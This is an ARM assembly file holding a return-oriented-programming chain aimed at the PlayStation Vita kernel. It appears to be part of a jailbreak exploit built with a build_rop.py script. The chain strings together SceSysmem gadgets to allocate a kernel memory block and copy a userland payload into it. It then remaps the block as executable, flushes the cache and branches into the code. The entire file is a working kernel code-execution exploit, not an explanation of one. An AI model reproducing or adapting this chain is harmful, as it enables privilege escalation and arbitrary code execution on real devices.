@ these are provided by build_rop.py
@ .equ PAYLOAD_ADDR, 0x810D0000
@ .equ PAYLOAD_SIZE, 0x00000080
@ .equ BASE, 0x81002000

.syntax unified

__payload_start:
allocate_code_block:
  .word BASE+0x00000031 @ pop {r0, pc}
  .word      0x08106803 @ r0 = 0x08106803
  .word BASE+0x0001eff1 @ lsls r0, r0, #1 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0001efe1 @ movs r1, r0 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001b571 @ lsls r2, r0, #5 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001e43 @ and r2, r2, #0xf0000 @ cmp.w r2, #0x40000 @ beq #0x1e5c @ movs r0, #0 @ pop {r3, r4, r5, pc}
  .word      0x00000000 @ r3 = NULL
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r5 = dummy
  .word BASE+0x00000031 @ pop {r0, pc}
  .word BASE+0x00027913 @ r0 = "Magic"
  .word BASE+0x0000a523 @ ksceKernelAllocMemBlock(r0 = "Magic", r1 = 0x1020D006, r2 = 0xA0000, r3 = NULL) @ pop {r4,pc}
  .word      0xDEADBEEF @ r4 = dummy

get_code_block:
  .word BASE+0x00000ce3 @ pop {r4, r5, r6, r7, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r5 = dummy
  .word      0xDEADBEEF @ r6 = dummy
  .word BASE+0x0000587f @ r7 = movs r2, r0 @ pop {r4, pc}
  .word BASE+0x00019713 @ add r3, sp, #0x28 @ blx r7
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00001e1d @ mov r0, r3 @ pop {r4, pc}
  .word      0x00000000 @ r4 = 0x0
  .word BASE+0x0001efe1 @ movs r1, r0 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001603 @ mov r0, r2 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001f17 @ ksceKernelGetMemBlockBase(r0 = payload_code_blockid, r1 = payload_code_block) @ pop {r3,pc}
  .word      0xDEADBEEF @ r3 = dummy

@ save code block to r7 for exec later
save_base_addr:
  .word BASE+0x00000031 @ pop {r0, pc}
  .word      0xDEADBEEF @ r0 = payload_code_block (written to from above)
  .word BASE+0x00023b61 @ movs r7, r0 @ movt r0, #0x8002 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}

copy_from_user_to_kernel:
@SceSysmem_pop_r0_r1_r2_r3_r4_pc, 0x258bd
@r0=payload_code_block
@r1=PAYLOAD_ADDR
@r2=PAYLOAD_SIZE
@SceSysmem_ksceKernelMemcpyUserToKernel, 0x6289
  .word BASE+0x000258fd @ pop {r0, r1, r2, r3, r4, pc}
  .word      0xDEADBEEF @ r0 = dummy
  .word    PAYLOAD_ADDR @ r1 = PAYLOAD_ADDR
  .word    PAYLOAD_SIZE @ r2 = PAYLOAD_SIZE
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x0000825d @ ksceKernelMemcpyUserToKernel(r0 = payload_code_block, r1 = PAYLOAD_ADDR, r2 = PAYLOAD_SIZE); ?pop {r3, r4, r5, pc}?

mark_executable:
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001bf47 @ movs r1, #0 @ bx lr
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x0000af33 @ ksceKernelFindMemBlockByAddr(r0 = payload_code_block, r1 = 0); pop {r3, r4, r5, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word  SECOND_PAYLOAD @ r5 = second payload userland address (arg1 to payload)
  .word BASE+0x0001fc6d @ blx r3 @ pop {r4, pc}
  .word BASE+0x0000ea73 @ movs r3, r0 @ bx lr
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00000853 @ pop {r0, r1, pc}
  .word      0xffffffff @ r0 = 0xffffffff
  .word      0x08106803 @ r1 = 0x8106803
  .word BASE+0x000233d3 @ lsls r2, r1, #1 @ bx lr
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00000433 @ subs r1, r2, #1 @ ands r0, r1 @ beq #0x450 @ clz r0, r0 @ sub.w r4, r3, r0, lsr #3 @ subs r0, r4, #1 @ pop {r4, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x000150a3 @ mov r0, r3 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0000a74d @ ksceKernelRemapBlock(r0 = payload_code_blockid, r1 = 0x1020D005) @ bx lr
  .word BASE            @ r4 = sysmem base (arg0 to payload)

clean_dcache:
  .word BASE+0x00000853 @ pop {r0, r1, pc}
  .word      0xDEADBEEF @ r0
  .word    PAYLOAD_SIZE @ r1
  .word BASE+0x00001605 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x00001605 @ pop {r3, pc}
  .word BASE+0x00022fcd @ ksceKernelCpuDcacheWritebackRange(r0 = payload_code_block, r1 = size)
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3

execute_code:
  .word BASE+0x00011c5f @ blx r7
